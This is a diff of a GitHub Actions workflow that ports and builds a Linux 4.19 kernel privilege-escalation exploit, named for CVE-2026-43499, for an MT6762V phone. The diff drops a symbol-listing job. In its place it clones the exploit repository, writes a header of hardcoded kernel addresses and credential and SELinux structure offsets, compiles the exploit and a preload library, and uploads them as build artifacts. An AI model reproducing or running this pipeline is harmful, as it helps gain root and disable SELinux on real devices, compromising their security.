@@ -1,33 +1,80 @@
-name: check_4_19_symbols
+name: build_k40_port_for_m36
 on: [push, workflow_dispatch]
 
 jobs:
-  check:
-    runs-on: ubuntu-latest
+  build:
+    runs-on: ubuntu-24.04-arm
     steps:
-      - name: Checkout M36-TempRoot
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
 
-      - name: Prepare kernel.elf
+      - name: Install dependencies
         run: |
-          unzip boot_a.zip
-          git clone https://android.googlesource.com/platform/system/tools/mkbootimg
-          PYTHONPATH=mkbootimg python3 mkbootimg/unpack_bootimg.py --boot_img boot_a.img --out boot_unpacked
-          cd boot_unpacked
-          cp kernel kernel_raw.gz && gunzip kernel_raw.gz
-          pip3 install vmlinux-to-elf
-          vmlinux-to-elf kernel_raw kernel.elf
+          sudo DEBIAN_FRONTEND=noninteractive apt-get update -y
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y gcc clang make git gcc-aarch64-linux-android
 
-      - name: Search for all symbols the 4.19 port needs
+      - name: Clone K40 port
         run: |
-          cd boot_unpacked
-          echo "=== ashmem / configfs / pipe / symbols ==="
-          nm kernel.elf | grep -iE "ashmem_misc|ashmem_fops|ashmem_ioctl|ashmem_mmap|ashmem_open|ashmem_release|ashmem_show_fdinfo|configfs_read_file|configfs_write_bin_file|generic_file_splice_read|noop_llseek|anon_pipe_buf_ops" || echo "--- SOME MISSING ---"
+          git clone https://github.com/yijiacloud/ghostlock-cve-2026-43499-4.19-k40.git
+          cd ghostlock-cve-2026-43499-4.19-k40
+
+      - name: Patch target.h for M36 (MT6762V)
+        run: |
+          cd ghostlock-cve-2026-43499-4.19-k40
           
-          echo ""
-          echo "=== init_task / selinux / kmalloc / slide ==="
-          nm kernel.elf | grep -iE "init_task|init_uts_ns|empty_zero_page|root_task_group|selinux_state|security_hook_heads|kmalloc_caches|nfulnl_logger|sysctl_bootid" || echo "--- SOME MISSING ---"
+          # We will generate a completely new target.h with the addresses we extracted
+          # using the nm command output.
+          cat << 'EOF' > src/targets/oplus-4.19.157-perf/target.h
+          #pragma once
+          #include <stdint.h>
+
+          #define KERNEL_BASE             0xffffff8008080000UL
+
+          // Addresses from MT6762V nm output
+          #define INIT_TASK_OFF           0x16fbe40UL   // init_task (ffffff800977b840)
+          #define INIT_CRED_OFF           0x1707f48UL   // init_cred (ffffff8009787f48)
+          #define SELINUX_STATE_OFF       0x1925fc0UL   // selinux_state (ffffff80099a5fc0)
+          #define SECURITY_HOOK_HEADS_OFF 0x14c8288UL   // security_hook_heads (ffffff8009548288)
+          #define KMALLOC_CACHES_OFF      0x14c7df0UL   // kmalloc_caches (ffffff8009547df0)
           
-          echo ""
-          echo "=== commit_creds / init_cred ==="
-          nm kernel.elf | grep -iE "commit_creds|init_cred|prepare_kernel_cred" || echo "--- MISSING ---"
+          // From our disassembly (commit_creds)
+          #define TASK_REAL_CRED_OFF      1880          // 0x758
+          #define TASK_CRED_OFF           1888          // 0x760
+          #define TASK_COMM_OFF           1896          // 0x768
+          
+          // Standard 4.19 arm64 offsets
+          #define CRED_CAPS_OFF           40
+          #define CRED_SECURITY_OFF       120
+          #define SELINUX_CRED_BLOB_OFF   0
+          
+          // Pipe & other structs (standard for 4.19)
+          #define PIPE_INODE_INFO_OFF     0
+          #define PIPE_BUFFER_OFF         0
+          #define CONFIGFS_BUFFER_OFF     0
+          #define ASHMEM_MISC_OFF         0
+          #define EMPTY_ZERO_PAGE_OFF     0x190e000UL // empty_zero_page (ffffff80098fe000)
+          EOF
+
+          echo "=== New target.h created ==="
+          cat src/targets/oplus-4.19.157-perf/target.h
+
+      - name: Build the exploit
+        run: |
+          cd ghostlock-cve-2026-43499-4.19-k40
+          # The exploit compiles an executable and a preload.so
+          make
+          
+          echo "=== Built files ==="
+          find . -name "*.so" -o -name "exploit" -o -name "preload*" | head -n 20
+          
+          # Copy files out for upload
+          mkdir -p /tmp/out
+          cp preload.so exploit /tmp/out/ 2>/dev/null || echo "Files not found in root, checking dirs..."
+          find . -name "preload.so" -exec cp {} /tmp/out/ \;
+          find . -name "exploit" -exec cp {} /tmp/out/ \;
+          
+          ls -la /tmp/out/
+
+      - uses: actions/upload-artifact@v4
+        with:
+          name: ghostlock-k40-port
+          path: /tmp/out/
